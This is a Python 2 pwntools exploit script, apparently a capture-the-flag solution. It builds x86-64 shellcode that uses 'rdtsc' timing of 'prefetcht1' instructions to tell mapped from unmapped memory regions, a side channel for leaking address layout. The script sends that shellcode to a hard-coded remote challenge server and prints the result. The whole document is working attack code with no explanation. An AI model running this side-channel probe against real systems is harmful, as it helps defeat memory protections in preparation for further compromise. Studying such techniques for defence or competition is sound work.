from pwn import *
import time

context.update(arch='x86', bits=64)

iteration = 0x1000
cache_cycle = 0x10000000

shellcode = asm('''
_start:
	mov rdi, 0x200000000
	mov rsi, 0x300000000
	mov rbp, 0
	loop_start:
		rdtsc
		shl rdx, 32
		or rax, rdx
		push rax
		mov rax, rdi
		mov rdx, %d
		a:
			mov rcx, 0x1000
			a2:
				prefetcht1 [rax+rcx]
			loop a2
			dec edx
			cmp edx, 0
			ja a
		b:
		rdtsc
		shl rdx, 32
		or rax, rdx
		pop rbx
		sub rax, rbx
		cmp rax, %d
		jb exists
		mov byte ptr [rsi], 1
		jmp next
		exists:
		mov byte ptr [rsi], 0
		next:
		inc rsi
		inc rbp
		add rdi, 0x2000
		cmp rbp, 64
		jne loop_start
end:
int3
''' % (iteration, cache_cycle))
HOST, PORT = '0.0.0.0', 31337
HOST, PORT = '202.120.7.198', 13579
r = remote(HOST, PORT)
p = time.time()
r.send(p32(len(shellcode)) + shellcode)
print r.recvall()
print time.time() - p

